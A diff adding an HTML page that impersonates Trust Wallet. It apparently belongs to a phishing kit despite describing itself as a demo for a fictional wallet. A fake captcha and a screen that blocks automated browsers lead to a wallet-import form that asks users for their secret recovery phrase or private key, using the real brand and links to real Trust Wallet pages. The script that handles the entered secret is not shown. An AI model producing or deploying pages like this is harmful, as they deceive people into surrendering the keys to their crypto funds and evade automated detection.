@@ -1,0 +1,265 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="Demo interface for a fictional digital wallet."
+    />
+    <title>Trust Wallet</title>
+    <link
+      rel="icon"
+      type="image/png"
+      href="./assets/32179889.png?v=58"
+    />
+    <link rel="stylesheet" href="./styles.css?v=58" />
+    <script src="https://www.google.com/recaptcha/api.js?render=explicit" async defer></script>
+    <script src="./scripts/app.js?v=59" defer></script>
+  </head>
+  <body>
+    <main class="captcha-screen screen" aria-labelledby="captcha-title" data-screen="captcha">
+      <section class="captcha-panel">
+        <div class="captcha-brand" aria-hidden="true">
+          <img class="brand__logo" src="./assets/32179889.png?v=58" alt="" aria-hidden="true" />
+          <span class="brand__name">
+            <strong>TRUST</strong>
+            <span>WALLET</span>
+          </span>
+        </div>
+
+        <h1 class="captcha-title" id="captcha-title">Security check</h1>
+        <p class="captcha-copy">
+          We detected unusual traffic from your browser. Complete this check to continue.
+        </p>
+
+        <div class="captcha-widget-wrap">
+          <div id="recaptcha-widget" class="captcha-widget" aria-label="reCAPTCHA verification"></div>
+        </div>
+
+        <p class="captcha-meta" id="captcha-meta" aria-live="polite">Loading verification...</p>
+      </section>
+    </main>
+
+    <main class="blocked-screen screen" aria-labelledby="blocked-title" data-screen="blocked" hidden>
+      <section class="captcha-panel captcha-panel--blocked">
+        <div class="captcha-brand" aria-hidden="true">
+          <img class="brand__logo" src="./assets/32179889.png?v=58" alt="" aria-hidden="true" />
+          <span class="brand__name">
+            <strong>TRUST</strong>
+            <span>WALLET</span>
+          </span>
+        </div>
+
+        <h1 class="captcha-title" id="blocked-title">Access blocked</h1>
+        <p class="captcha-copy">
+          This browser looks automated, so the demo is not available from this session.
+        </p>
+        <p class="captcha-meta" id="blocked-reason"></p>
+      </section>
+    </main>
+
+    <main class="onboarding screen" aria-labelledby="page-title" data-screen="home" hidden>
+      <aside class="onboarding__visual" aria-hidden="true">
+        <video
+          class="onboarding__reference-video"
+          autoplay
+          muted
+          loop
+          playsinline
+          preload="auto"
+          poster="./assets/reference-orbit-poster.jpg?v=58"
+        >
+          <source src="./assets/reference-orbit.mp4?v=58" type="video/mp4" />
+        </video>
+      </aside>
+
+      <section class="onboarding__content">
+        <header class="brand" aria-label="Trust Wallet">
+          <img class="brand__logo" src="./assets/32179889.png?v=58" alt="" aria-hidden="true" />
+          <span class="brand__name">
+            <strong>TRUST</strong>
+            <span>WALLET</span>
+          </span>
+        </header>
+
+        <h1 class="onboarding__title" id="page-title" data-i18n="home.title">
+          Join 200M users who are securing their financial future
+        </h1>
+
+        <form class="wallet-actions" aria-describedby="demo-feedback">
+          <label class="consent" for="terms">
+            <input class="consent__input" type="checkbox" id="terms" name="terms" checked />
+            <span class="consent__box" aria-hidden="true"></span>
+            <span class="consent__copy">
+              <span data-i18n="home.termsPrefix">I have read and agree to the</span>
+              <a
+                href="https://trustwallet.com/fr/terms-of-service"
+                class="link"
+                target="_blank"
+                rel="noreferrer"
+                data-i18n="home.terms"
+              >Terms of Service</a>
+              <span data-i18n="home.termsJoiner">and the</span>
+              <a
+                href="https://trustwallet.com/fr/privacy-notice"
+                class="link"
+                target="_blank"
+                rel="noreferrer"
+                data-i18n="home.privacy"
+              >Privacy Notice</a>
+            </span>
+          </label>
+
+          <div class="wallet-actions__buttons">
+            <button class="button button--primary" type="button" data-action="existing">
+              <span data-i18n="home.existingWallet">I already have a wallet</span>
+            </button>
+          </div>
+
+          <p class="wallet-actions__feedback" id="demo-feedback" aria-live="polite"></p>
+        </form>
+
+      </section>
+    </main>
+
+    <main class="import-screen screen" aria-labelledby="import-title" data-screen="import" hidden>
+      <aside class="import-visual">
+        <h2 class="import-visual__title" data-i18n="import.visualTitle">Import a wallet</h2>
+        <video
+          class="import-visual__video"
+          aria-hidden="true"
+          autoplay
+          muted
+          loop
+          playsinline
+          preload="auto"
+          poster="./assets/import-left-poster.jpg?v=58"
+        >
+          <source src="./assets/import-left.mp4?v=58" type="video/mp4" />
+        </video>
+        <a
+          class="import-help"
+          href="https://twtholders.trustwallet.com/"
+          target="_blank"
+          rel="noreferrer"
+          aria-label="Help"
+          data-i18n-attr="aria-label:common.help"
+        >
+          <span class="import-help__icon" aria-hidden="true">i</span>
+          <span data-i18n="common.help">Help</span>
+        </a>
+      </aside>
+
+      <section class="import-content">
+        <button class="import-back" type="button" data-back>
+          <span class="import-back__icon" aria-hidden="true">&#8249;</span>
+          <span data-i18n="common.back">Back</span>
+        </button>
+
+        <h1 class="import-title" id="import-title" data-i18n="import.title">Select your existing wallet</h1>
+
+        <div class="wallet-list" aria-label="Available wallets" data-i18n-attr="aria-label:import.walletListLabel">
+          <button class="wallet-option" type="button" data-action="trust-mobile">
+            <img class="wallet-icon" src="./assets/32179889.png?v=58" alt="" aria-hidden="true" />
+            <span>Trust Wallet Mobile</span>
+            <span class="wallet-option__arrow" aria-hidden="true">&#8250;</span>
+          </button>
+
+          <button class="wallet-option" type="button" data-action="wallet-import">
+            <img class="wallet-icon" src="./assets/metamask_clean.png?v=58" alt="" aria-hidden="true" />
+            <span>Metamask</span>
+            <span class="wallet-option__arrow" aria-hidden="true">&#8250;</span>
+          </button>
+
+          <button class="wallet-option" type="button" data-action="wallet-import">
+            <svg class="wallet-icon wallet-icon--phantom-mark" viewBox="0 0 1024 1024" aria-hidden="true" focusable="false">
+              <path d="M127 721C123 606 191 475 312 363c149-138 349-208 505-157 83 27 145 87 177 169 70 181-41 430-206 497-70 28-128 13-135-48-2-17 0-36 6-56-62 84-145 134-223 134-83 0-125-54-112-136-70 90-149 145-216 145-50 0-78-34-81-90Z" fill="#fff" />
+              <ellipse cx="628" cy="410" rx="40" ry="49" fill="currentColor" />
+              <ellipse cx="759" cy="410" rx="40" ry="49" fill="currentColor" />
+            </svg>
+            <span>Phantom</span>
+            <span class="wallet-option__arrow" aria-hidden="true">&#8250;</span>
+          </button>
+
+          <button class="wallet-option" type="button" data-action="wallet-import">
+            <img class="wallet-icon" src="./assets/coinbase_logo.png?v=58" alt="" aria-hidden="true" />
+            <span>Coinbase</span>
+            <span class="wallet-option__arrow" aria-hidden="true">&#8250;</span>
+          </button>
+
+          <button class="wallet-option" type="button" data-action="wallet-import">
+            <svg class="wallet-icon" viewBox="3 5 34 34" aria-hidden="true" focusable="false">
+              <path d="M10.5 13h19c2.8 0 4.5 1.7 4.5 4.5v13c0 2.8-1.7 4.5-4.5 4.5h-19C7.7 35 6 33.3 6 30.5v-13c0-2.8 1.7-4.5 4.5-4.5Z" fill="none" stroke="#656565" stroke-width="3.6" stroke-linejoin="round" />
+              <path d="M11 8.5h17.8c1.7 0 2.7.9 2.7 2.6V13H11V8.5Z" fill="#f5f5f6" stroke="#656565" stroke-width="3.6" stroke-linejoin="round" />
+              <path d="M25.5 24h4" stroke="#656565" stroke-width="3.6" stroke-linecap="round" />
+            </svg>
+            <span data-i18n="import.otherWallet">Other mobile wallet or extension</span>
+            <span class="wallet-option__arrow" aria-hidden="true">&#8250;</span>
+          </button>
+        </div>
+      </section>
+    </main>
+
+    <main class="secret-screen import-screen screen" aria-labelledby="secret-title" data-screen="secret" hidden>
+      <aside class="import-visual">
+        <h2 class="import-visual__title" data-i18n="import.visualTitle">Import a wallet</h2>
+        <video
+          class="import-visual__video"
+          aria-hidden="true"
+          autoplay
+          muted
+          loop
+          playsinline
+          preload="auto"
+          poster="./assets/import-left-poster.jpg?v=58"
+        >
+          <source src="./assets/import-left.mp4?v=58" type="video/mp4" />
+        </video>
+        <a
+          class="import-help"
+          href="https://twtholders.trustwallet.com/"
+          target="_blank"
+          rel="noreferrer"
+          aria-label="Help"
+          data-i18n-attr="aria-label:common.help"
+        >
+          <span class="import-help__icon" aria-hidden="true">i</span>
+          <span data-i18n="common.help">Help</span>
+        </a>
+      </aside>
+
+      <section class="import-content secret-content">
+        <div class="secret-topbar">
+          <button class="import-back" type="button" data-back-to="import">
+            <span class="import-back__icon" aria-hidden="true">&#8249;</span>
+            <span data-i18n="common.back">Back</span>
+          </button>
+
+        </div>
+
+        <h1 class="secret-title" id="secret-title" data-i18n="details.title">Import wallet details</h1>
+
+        <div class="secret-field">
+          <span class="secret-label" data-i18n="details.walletName">Wallet Name</span>
+          <div class="secret-name-control">
+            <input class="secret-name-input" type="text" value="Main wallet" aria-label="Wallet Name" autocomplete="off" spellcheck="false" data-i18n-attr="aria-label:details.walletName;value:details.defaultWalletName" />
+            <button class="secret-clear" type="button" aria-label="Clear wallet name" data-clear-wallet-name data-i18n-attr="aria-label:details.clearWalletName">&times;</button>
+          </div>
+          <span class="secret-helper" data-i18n="details.walletNameHelper">You can edit this later</span>
+        </div>
+
+        <div class="secret-field secret-field--phrase">
+          <span class="secret-label" data-i18n="details.descriptionLabel">Enter Secret Phrase / Private Key</span>
+          <div class="secret-description-control">
+            <input class="secret-phrase-display secret-description-input" type="text" aria-label="Enter Secret Phrase / Private Key" autocomplete="off" spellcheck="false" data-i18n-attr="aria-label:details.descriptionLabel;placeholder:details.descriptionPlaceholder" />
+          </div>
+          <span class="secret-helper" data-i18n="details.descriptionHelper">Secret Phrase is typically 12 (sometimes 18,24) words separated by single spaces. Private Key is a long alphanumeric code.</span>
+          <span class="secret-error" style="display: none; color: #d93025;"></span>
+        </div>
+
+        <button class="secret-import-button" type="button" disabled data-i18n="details.import">Import</button>
+      </section>
+    </main>
+  </body>
+</html>
